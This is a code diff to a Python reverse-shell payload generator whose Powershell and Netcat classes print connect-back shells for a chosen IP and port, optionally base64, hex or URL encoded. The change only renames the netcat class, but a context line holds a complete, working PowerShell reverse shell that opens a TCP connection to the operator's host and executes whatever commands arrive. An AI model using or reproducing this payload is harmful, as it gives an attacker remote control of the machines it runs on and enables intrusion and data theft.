@@ -62,7 +62,7 @@ class Powershell(Encode):
         self.__payload = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+self.__ip+"',"+self.__porta+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
         super().__init__(self.__payload)
 
-class netcat(Encode):
+class Netcat(Encode):
     
     def __init__(self:object,ip:str,porta:str):
         self.__ip = ip
@@ -109,10 +109,10 @@ if __name__ == "__main__":
             print(Powershell(args.ip,args.porta).urlencode())
     elif args.payload == "nc":
         if args.encode is None:
-            print(netcat(args.ip,args.porta).shell())
+            print(Netcat(args.ip,args.porta).shell())
         elif args.encode == "base64":
-            print(netcat(args.ip,args.porta).base64())
+            print(Netcat(args.ip,args.porta).base64())
         elif args.encode == "hex":
-            print(netcat(args.ip,args.porta).hexadecimal())
+            print(Netcat(args.ip,args.porta).hexadecimal())
         elif args.encode == "urlencode":
-            print(netcat(args.ip,args.porta).urlencode())
+            print(Netcat(args.ip,args.porta).urlencode())
